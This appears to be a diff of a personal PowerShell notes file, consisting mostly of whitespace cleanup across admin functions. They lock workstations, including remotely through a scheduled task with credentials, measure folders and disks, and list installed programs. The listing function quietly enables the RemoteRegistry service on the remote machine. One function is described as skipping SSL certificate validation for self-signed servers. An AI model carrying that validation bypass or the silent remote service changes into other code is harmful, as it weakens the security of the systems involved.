+    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
+    $LockWorkStation::LockWorkStation() | Out-Null
+  } | Register-ScheduledTask TestTask -ComputerName $Computername -credential:$Credential
 }
 
 Function llm { #lock Local machine lock computer
-  $signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"  
-	$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru  
+  $signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"
+	$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
 	$LockWorkStation::LockWorkStation()|Out-Null
 }
 
@@ -481,7 +541,7 @@ ii foo.xls
 
 5.Copy Environment value to clipboard (so now u know how to use clipboard!)
 
-$env:appdata | % { [windows.forms.clipboard]::SetText($input) } 
+$env:appdata | % { [windows.forms.clipboard]::SetText($input) }
 OR
 ls | clip
 #>
@@ -520,8 +580,8 @@ https://github.com/dfinke/ImportExcel  # Finke
 https://github.com/dfinke?tab=repositories
 
 #==============================================================================
-# Using a target web service that requires SSL, but server is self-signed.  
-# Without this, we'll fail unable to establish trust relationship. 
+# Using a target web service that requires SSL, but server is self-signed.
+# Without this, we'll fail unable to establish trust relationship.
 function Set-CertificateValidationCallback
 {
     try
@@ -568,7 +628,7 @@ function Get-FolderSizes {
     if (!$getFolder.Size) { #for "special folders" like appdata
       $lengthSum = gci $folder.FullName -recurse -force -ea silentlyContinue | `
         measure -sum length -ea SilentlyContinue | select -expand sum
-      $sizeMBs = "{0:N0}" -f ($lengthSum /1mb)      
+      $sizeMBs = "{0:N0}" -f ($lengthSum /1mb)
     } #close if size property is null
       else { $sizeMBs = "{0:N0}" -f ($getFolder.size /1mb) }
       #else {$sizeMBs = [int]($getFolder.size /1mb) }
@@ -583,14 +643,14 @@ function Get-FolderSizes {
   $sum = $folders | select -expand sizeMB | measure -sum | select -expand sum
   $sum += ( gci -file $path | measure -property length -sum | select -expand sum ) / 1mb
   $sumString = "{0:n2}" -f ($sum /1kb)
-  $sumString + " GB total" 
+  $sumString + " GB total"
 } #end function
 set-alias gfs Get-FolderSizes
 
 function get-drivespace {
   param( [parameter(mandatory=$true)]$Computer)
   if ($computer -like "*.com") {$cred = get-credential; $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer -credential $cred }
-  else { $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer }  
+  else { $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer }
   $qry | select `
     @{n="drive"; e={$_.deviceID}}, `
     @{n="GB Free"; e={"{0:N2}" -f ($_.freespace / 1gb)}}, `
@@ -607,7 +667,7 @@ function New-URLfile {
   $header = '[InternetShortcut]'
   $content += $header
   $content += "URL=" + $target
-  $content | out-file $link  
+  $content | out-file $link
   ii $link
 } #end function
 
@@ -622,7 +682,7 @@ function New-LNKFile {
 
 Poor man's grep? For searching large txt files.
 function Search-TextFile {
-  param( 
+  param(
     [parameter(mandatory=$true)]$File,
     [parameter(mandatory=$true)]$SearchText
   ) #close param
@@ -632,7 +692,7 @@ function Search-TextFile {
   foreach ($line in $lines) { if ($line -match $SearchText) {$line} }
 } #end function Search-TextFile
 
-Lists programs installed on a remote computer. 
+Lists programs installed on a remote computer.
 function Get-InstalledProgram { [cmdletBinding()] #http://blogs.technet.com/b/heyscriptingguy/archive/2011/11/13/use-powershell-to-quickly-find-installed-software.aspx
       param( [parameter(mandatory=$true)]$Comp,[parameter(mandatory=$false)]$Name )
       $keys = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
@@ -643,10 +703,10 @@ function Get-InstalledProgram { [cmdletBinding()] #http://blogs.technet.com/b/he
         #Enable and start RemoteRegistry service
         if ($rrSvc.State -ne 'Running') {
           if ($rrSvc.StartMode -eq 'Disabled') { $null = $rrSvc.ChangeStartMode('Manual'); $undoMe2 = $true }
-          $null = $rrSvc.StartService() ; $undoMe = $true       
+          $null = $rrSvc.StartService() ; $undoMe = $true
         } #close if rrsvc not running
           else {"Unable to connect. Make sure that this computer is on the network, has remote administration enabled, `nand that both computers are running the remote registry service."; break}
-        $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp)  
+        $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp)
       } #close if failed to connect regbase
       $out = @()
       foreach ($key in $keys) {
@@ -710,7 +770,7 @@ https://github.com/manojlds/pslinq
 
 https://en.wikiversity.org/wiki/Windows_PowerShell/Functions
 
-http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file 
+http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file
 https://github.com/tomasr/dotfiles/blob/master/.profile.ps1
 https://github.com/tomasr/dotfiles
 https://github.com/adjohnson916/PowerShell-profile
@@ -751,4 +811,4 @@ PS> 1..5 | % { $result = 0 } { $result += $_ } { $result } # % is an alias for F
 
 
 filter num2x { $_ -replace "\d","x" }
-Get-Content test.txt | num2x | add-content new.txt 
+Get-Content test.txt | num2x | add-content new.txt
